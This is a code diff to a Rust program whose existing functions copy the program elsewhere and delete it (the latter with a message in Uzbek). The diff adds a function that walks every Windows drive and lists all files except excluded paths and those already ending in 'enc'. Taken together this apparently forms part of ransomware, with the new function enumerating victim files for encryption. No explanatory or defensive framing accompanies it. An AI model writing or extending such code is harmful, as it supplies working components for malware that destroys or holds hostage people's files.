@@ -1,6 +1,7 @@
-use std::path::Path;
+use std::path::{Path, PathBuf};
 use std::process::Command;
 use std::{env, fs};
+use walkdir::WalkDir;
 
 pub fn clone_self(new_location: &String) {
     let target = Path::new(&new_location);
@@ -60,4 +61,20 @@ pub fn self_delete() {
         .spawn();
 
     println!("O'z-o'zini o'chirish jarayoni ishga tushirildi.");
+}
+
+pub fn collect_paths(excluded_paths: &[&str]) -> Result<Vec<PathBuf>, Box<dyn std::error::Error>>{
+    let mut paths = Vec::new();
+    for drive in ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "W", "X", "Y", "Z"]{
+        let root = format!("{}:\\", drive);
+        if Path::new(&root).exists() {
+            for entry in WalkDir::new(&root).into_iter().filter_map(Result::ok) {
+                let p = entry.into_path();
+                if p.is_file() && !excluded_paths.iter().any(|ex| p.to_string_lossy().contains(ex)) && !p.to_string_lossy().ends_with("enc") {
+                    paths.push(p);
+                }
+            }
+        }
+    }
+    Ok(paths)
 }
